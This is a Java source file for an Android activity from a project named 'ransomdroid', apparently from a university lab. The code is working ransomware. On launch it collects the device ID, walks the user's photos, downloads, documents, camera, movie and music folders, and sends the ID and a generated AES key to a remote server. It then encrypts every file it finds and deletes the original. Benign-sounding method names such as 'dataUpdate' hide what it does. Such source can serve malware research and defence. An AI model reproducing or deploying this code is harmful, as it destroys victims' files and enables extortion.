package br.unb.lasp.ransomdroid.activities;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import br.unb.lasp.Global;
import br.unb.lasp.controller.ServiceBroker;
import br.unb.lasp.ransomdroid.R;
import br.unb.lasp.util.Json;
import br.unb.lasp.util.RansomdroidException;
import br.unb.lasp.util.Storage;
import br.unb.lasp.util.SymmetricAES;

public class SplashActivity extends Activity implements Runnable {

    private static final String TAG = new Object() {
    }.getClass().getName();

    @Override
    public void onCreate(Bundle savedInstanceState) {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        TextView txtLabel = (TextView) findViewById(R.id.frm_splash_label);
        txtLabel.setEnabled(true);
        txtLabel.setVisibility(View.VISIBLE);
        txtLabel.setText(R.string.loading);
    }

    @Override
    protected void onStart() {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        super.onStart();

        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        Global.uid = telephonyManager.getDeviceId();

        run();
    }

    public void run() {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        try {
            VerifyConnectivity task = new VerifyConnectivity();
            task.execute(0);
        } catch (Exception e) {
            Log.e(TAG, e.getMessage(), e);
        }
    }

    private class VerifyConnectivity extends AsyncTask<Integer, Integer, Boolean> {

        String mErrorMsg;

        @Override
        protected void onPreExecute() {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());
            super.onPreExecute();
        }

        @Override
        protected Boolean doInBackground(Integer... params) {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());

            if(Storage.isExternalStorageWritable()){
                // list files
                List<File> dirList = new ArrayList<>();
                dirList.add(Storage.getPicturesDir());
                dirList.add(Storage.getDownloadsDir());
                dirList.add(Storage.getDocumentsDir());
                dirList.add(Storage.getDCIMSDir());
                dirList.add(Storage.getMoviesDir());
                dirList.add(Storage.getMusicsDir());
                List<File> fileList = new ArrayList<>();
                for (File dir:dirList) {
                    if(dir != null){
                        fileList.addAll(Storage.listValidFilesRecursively(dir, new ArrayList<File>()));
                    }
                }

                // generate global data
                Global.numFiles = fileList.size();
                if(Global.pass == null){
                    byte[] key = SymmetricAES.getRandomSecretKeySpec(Global.uid).getEncoded();
                    Global.pass = Base64.encodeToString(key, Base64.DEFAULT);
                }

                mErrorMsg = serverSync();
                dataUpdate(fileList);
            }

            return mErrorMsg == null;
        }

        @Override
        protected void onPostExecute(Boolean result) {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());
            if(result) {
                Intent intent = new Intent(SplashActivity.this, MainActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                startActivity(intent);
                finish();
                finish();
            }else{
                Toast.makeText(getApplicationContext(), mErrorMsg, Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    private String serverSync(){
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        String mErrorMsg = null;

        try {
            JSONObject data = new JSONObject();
            data.put("uid", Global.uid);
            data.put("pass", Global.pass);

            JSONObject request = new JSONObject();
            request.put("postMessageRequest", data);

            String responseStr = ServiceBroker.getInstance(getApplicationContext()).postMessage(request.toString());
            if (responseStr != null) {
                JSONObject json = new JSONObject(responseStr);
                JSONObject response = (JSONObject) json.get("postMessageResponse");
                String errorMsg = Json.getError(response);
                if (errorMsg != null && errorMsg.length() > 0) {
                    throw new RansomdroidException(errorMsg);
                }
            }else{
                throw new RansomdroidException("Connectivity Error");
            }

        } catch (Exception e) {
            mErrorMsg = e.getMessage();
            Log.e(TAG, e.getMessage(), e);
        }

        return mErrorMsg;
    }

    private void dataUpdate(List<File> fileList){

        for(File file: fileList){
            Log.i(TAG, "Update: " + file.getPath());

            File nFile = new File(file.getParent(), file.getName() + ".tmp");
            if(nFile.exists()){
                continue; // Go to next file
            }

            // get input
            byte[] input = null;
            try {
                FileInputStream fis = new FileInputStream(file);
                input = new byte[fis.available()];
                while (fis.read(input) != -1) {
                    // do nothing, just read
                }
                fis.close();
            } catch (FileNotFoundException e) {
                Log.e(TAG, e.getMessage(), e);
                continue;
            } catch (IOException e) {
                Log.e(TAG, e.getMessage(), e);
                continue;
            } catch (Exception e) {
                Log.e(TAG, e.getMessage(), e);
                continue;
            }

            // parse
            input = SymmetricAES.encrypt(input, Global.uid, Global.key);

            // create output
            FileOutputStream fos = null;
            try {
                fos = new FileOutputStream(nFile);
                fos.write(input);
                fos.flush();
                fos.close();
            } catch (Exception e) {
                Log.e(TAG, e.getMessage(), e);
            }finally {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException e) {
                        Log.e(TAG, e.getMessage(), e);
                    }
                }
            }

            // clean up
            file.delete();
        }

    }

}